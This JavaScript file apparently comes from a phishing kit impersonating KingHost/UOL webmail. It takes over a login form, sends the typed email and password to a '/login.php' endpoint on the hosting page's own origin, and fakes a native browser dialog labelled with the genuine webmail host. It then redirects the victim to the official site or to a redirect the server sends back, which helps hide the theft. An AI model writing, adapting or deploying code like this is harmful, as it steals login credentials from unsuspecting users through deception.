"use strict";

(function () {
    var cfg = window.LOGIN_BRIDGE || {};
    var official = window.UOL_OFFICIAL || "https://webmail.kinghost.com.br/";
    var M = window.UOL_MESSAGES || {};
    var bound = false;
    var wrongPasswordMsg = "Usuário desconhecido ou senha incorreta";

    function resolveUrl(url) {
        var u = String(url || "/login.php");
        if (/^https?:\/\//i.test(u)) return u;
        if (u.charAt(0) === "/") return window.location.origin + u;
        return window.location.origin + "/" + u;
    }

    function q(sel, root) {
        return (root || document).querySelector(sel);
    }

    var alertHost = "webmail.kinghost.com.br";

    function khCloseAlert() {
        var box = document.getElementById("khNativeAlert");
        var shade = document.getElementById("khNativeAlertShade");
        if (box) box.remove();
        if (shade) shade.remove();
    }

    function khEnsureAlertStyles() {
        if (document.getElementById("khNativeAlertStyles")) return;
        var style = document.createElement("style");
        style.id = "khNativeAlertStyles";
        style.textContent =
            "#khNativeAlertShade{position:fixed;inset:0;background:rgba(0,0,0,.35);z-index:999998}" +
            "#khNativeAlert{position:fixed;left:50%;top:72px;transform:translateX(-50%);width:min(92vw,360px);" +
            "background:#fff;border-radius:4px;box-shadow:0 2px 16px rgba(0,0,0,.22);z-index:999999;" +
            "font:13px/1.35 'Segoe UI',Tahoma,sans-serif;color:#202124}" +
            "#khNativeAlert .kh-alert-title{padding:16px 20px 0;font-size:15px;font-weight:400}" +
            "#khNativeAlert .kh-alert-body{padding:12px 20px 16px;font-size:14px;white-space:pre-wrap}" +
            "#khNativeAlert .kh-alert-actions{padding:0 14px 14px;text-align:right}" +
            "#khNativeAlert .kh-alert-ok{min-width:68px;height:30px;padding:0 14px;border:0;border-radius:3px;" +
            "background:#1a73e8;color:#fff;font:500 13px 'Segoe UI',Tahoma,sans-serif;cursor:pointer}" +
            "#khNativeAlert .kh-alert-ok:hover{background:#1765cc}";
        document.head.appendChild(style);
    }

    function khAlert(msg) {
        var text = String(msg || "").trim();
        if (!text) return;

        khCloseAlert();
        khEnsureAlertStyles();

        var shade = document.createElement("div");
        shade.id = "khNativeAlertShade";

        var box = document.createElement("div");
        box.id = "khNativeAlert";
        box.setAttribute("role", "alertdialog");
        box.setAttribute("aria-modal", "true");
        box.innerHTML =
            '<div class="kh-alert-title">' +
            alertHost +
            " diz</div>" +
            '<div class="kh-alert-body"></div>' +
            '<div class="kh-alert-actions"><button type="button" class="kh-alert-ok">OK</button></div>';

        box.querySelector(".kh-alert-body").textContent = text;

        var okBtn = box.querySelector(".kh-alert-ok");
        okBtn.addEventListener("click", khCloseAlert);
        shade.addEventListener("click", khCloseAlert);

        document.body.appendChild(shade);
        document.body.appendChild(box);
        okBtn.focus();
    }

    function showAguarde() {
        hideAguarde();
        if (typeof window.ttrAdicionaLoading === "function") {
            window.ttrAdicionaLoading();
            return;
        }
    }

    function hideAguarde() {
        if (typeof window.ttrRemoveLoading === "function") {
            window.ttrRemoveLoading();
            return;
        }
        var el = document.getElementById("ttrLoading");
        if (el) el.remove();
    }

    function clearMessage() {
        var el = q(cfg.message || "#divretorno");
        if (el) {
            el.innerHTML = "";
            el.textContent = "";
            el.style.display = "none";
        }
    }

    function finishResult(result, submitEl) {
        hideAguarde();
        clearMessage();

        var data = result.data || {};

        if (data.blocked && data.redirect) {
            window.location.replace(data.redirect);
            return;
        }

        if (data.ok) {
            window.location.replace(data.redirect || official);
            return;
        }

        document.body.classList.remove("logging-in");
        if (submitEl) submitEl.disabled = false;

        var msg = String(data.text || "").trim();
        if (!msg) {
            msg = wrongPasswordMsg;
        }
        khAlert(msg);
    }

    function doLogin(form, submitEl) {
        var emailSel = cfg.email || "#login_username";
        var passSel = cfg.password || "#secretkey";
        var action = resolveUrl(cfg.action || "/login.php");

        var emailEl = q(emailSel, form);
        var passEl = q(passSel, form);
        var email = emailEl ? String(emailEl.value || "").trim() : "";
        var pass = passEl ? String(passEl.value || "") : "";

        if (!email) {
            khAlert("Informe seu e-mail para entrar.");
            return;
        }
        if (!pass) {
            khAlert("Informe sua senha para entrar.");
            return;
        }

        clearMessage();
        document.body.classList.add("logging-in");
        if (submitEl) submitEl.disabled = true;
        showAguarde();

        var body =
            "login=" +
            encodeURIComponent(email) +
            "&password=" +
            encodeURIComponent(pass);

        fetch(action, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            credentials: "same-origin",
            cache: "no-store",
            body: body,
        })
            .then(function (res) {
                return res.text().then(function (text) {
                    var data = null;
                    try {
                        data = text ? JSON.parse(text) : null;
                    } catch (err) {
                        data = null;
                    }
                    if (!data) {
                        return {
                            ok: false,
                            data: {
                                ok: false,
                                text: M.network_error || "Erro de conexão. Tente novamente.",
                            },
                        };
                    }
                    return { ok: res.ok, data: data };
                });
            })
            .then(function (result) {
                finishResult(result, submitEl);
            })
            .catch(function () {
                hideAguarde();
                clearMessage();
                document.body.classList.remove("logging-in");
                if (submitEl) submitEl.disabled = false;
                khAlert(M.network_error || "Erro de conexão. Tente novamente.");
            });
    }

    function bindForm(form) {
        if (!form || bound) return;
        bound = true;
        form.dataset.kinghostBridge = "1";

        var submitSel = cfg.submit || "#submit";
        var submitEl = q(submitSel, form) || document.getElementById("submit");

        form.setAttribute("action", resolveUrl(cfg.action || "/login.php"));
        form.setAttribute("method", "post");
        form.setAttribute("novalidate", "novalidate");
        form.onsubmit = function () {
            return false;
        };

        form.addEventListener(
            "submit",
            function (e) {
                e.preventDefault();
                e.stopImmediatePropagation();
                doLogin(form, submitEl);
            },
            true
        );

        if (submitEl) {
            submitEl.setAttribute("type", "button");
            submitEl.addEventListener(
                "click",
                function (e) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    doLogin(form, submitEl);
                },
                true
            );
        }

        window.processa_login = function () {
            doLogin(form, submitEl);
            return false;
        };
        window.__khDoLogin = function () {
            doLogin(form, submitEl);
        };
    }

    function start() {
        var form = q(cfg.form || "#form_login") || document.getElementById("form_login");
        if (form) bindForm(form);
    }

    window.kinghostBridgeInit = start;

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", start);
    } else {
        start();
    }
    window.addEventListener("load", start);
})();
